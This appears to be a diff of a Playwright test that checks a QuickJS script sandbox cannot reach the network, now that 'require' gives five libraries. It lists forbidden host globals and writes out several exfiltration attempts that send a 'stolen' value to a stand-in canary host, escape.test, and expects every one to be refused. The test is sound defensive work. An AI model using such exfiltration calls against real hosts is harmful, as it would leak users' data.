@@ -16,16 +16,16 @@ test.use({ serviceWorkers: "block" });
 /** A host no script may reach. Routed, so an attempt that got out would be counted, not lost in a DNS error. */
 const CANARY = "https://escape.test";
 
-/** What ECMAScript puts on a global object, as QuickJS has it, and the five names the host adds. Anything else got in. */
+/** What ECMAScript puts on a global object, as QuickJS has it, and the six names the host adds. Anything else got in. */
 const BUILT_INS =
   "AggregateError Array ArrayBuffer BigInt BigInt64Array BigUint64Array Boolean DataView Date Error EvalError FinalizationRegistry Float16Array Float32Array Float64Array Function Infinity Int16Array Int32Array Int8Array InternalError Iterator JSON Map Math NaN Number Object Promise Proxy RangeError ReferenceError Reflect RegExp Set SharedArrayBuffer String Symbol SyntaxError TypeError URIError Uint16Array Uint32Array Uint8Array Uint8ClampedArray WeakMap WeakRef WeakSet decodeURI decodeURIComponent encodeURI encodeURIComponent escape eval globalThis isFinite isNaN parseFloat parseInt undefined unescape";
-const ALLOWED = "pm console atob btoa setTimeout";
+const ALLOWED = "pm console atob btoa setTimeout require";
 
 /** Names a browser, a worker or Node would offer. None may exist inside the sandbox by any road. */
 const HOST_NAMES = [
   "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "RTCPeerConnection", "importScripts", "postMessage", "self", "window", "document",
   "navigator", "location", "Worker", "SharedWorker", "BroadcastChannel", "MessageChannel", "indexedDB", "caches", "localStorage", "sessionStorage", "cookieStore",
-  "WebAssembly", "crypto", "performance", "queueMicrotask", "setInterval", "structuredClone", "require", "process", "module", "host", "close", "name", "onmessage",
+  "WebAssembly", "crypto", "performance", "queueMicrotask", "setInterval", "structuredClone", "EventTarget", "process", "module", "host", "close", "name", "onmessage",
 ];
 
 interface Watch {
@@ -152,16 +152,25 @@ test("@claim:C-052 running a script makes no request: every network road is trie
         importScripts: () => importScripts("${CANARY}/import-scripts.js?" + stolen),
         Image: () => { new Image().src = "${CANARY}/image?" + stolen; },
         Worker: () => new Worker("${CANARY}/worker.js?" + stolen),
-        require: () => require("https").get("${CANARY}/require?" + stolen),
+        "require of a module of Node": () => require("https").get("${CANARY}/require?" + stolen),
         "a string given to setTimeout": () => { setTimeout("fetch('${CANARY}/timer-string')", 0); },
       };
       for (const [name, attempt] of Object.entries(attempts)) {
         pm.test(name + " is not there to call", () => {
           let error;
           try { attempt(); } catch (thrown) { error = thrown; }
-          if (!(error instanceof ReferenceError) && !(error instanceof TypeError)) throw new Error("it did not throw: " + error);
+          // \`require\` exists since P3.5 and gives five libraries: for anything else it throws its own named error.
+          const refused = name.startsWith("require") ? error && error.name === "WayfarerUnsupportedError" : error instanceof ReferenceError || error instanceof TypeError;
+          if (!refused) throw new Error("it did not throw: " + error);
         });
       }
+      pm.test("a library has no more than a script: nothing of the host by any of them", () => {
+        const names = ${JSON.stringify(HOST_NAMES)};
+        for (const library of ["chai", "crypto-js", "lodash", "moment", "uuid"]) require(library);
+        const found = names.filter((name) => Function("return typeof " + name)() !== "undefined" || typeof require("lodash").get(globalThis, name) !== "undefined");
+        if (found.length) throw new Error("found: " + found.join(", "));
+        if (typeof require("lodash").template("<%= typeof fetch %>")() !== "string" || require("lodash").template("<%= typeof fetch %>")() !== "undefined") throw new Error("a template reached fetch");
+      });
       let imported = "pending";
       import("${CANARY}/dynamic-import.js?" + stolen).then(() => { imported = "loaded"; }, (error) => { imported = "refused: " + error.name; });
       import("data:text/javascript,globalThis.escaped=true").then(() => { imported += ", data loaded"; }, () => { imported += ", data refused"; });
@@ -183,8 +192,8 @@ test("@claim:C-052 running a script makes no request: every network road is trie
   });
   const result = await rows(page);
   expect(result.failed).toEqual([]);
-  // Ten attempts, the dynamic import, and the forged result.
-  expect(result.passed).toHaveLength(12);
+  // Ten attempts, the libraries, the dynamic import, and the forged result.
+  expect(result.passed).toHaveLength(13);
   expect(result.passed).not.toContain("forged row");
 
   // From the outside: the canary host saw nothing, and the only request that left the app's origin is the user's own.
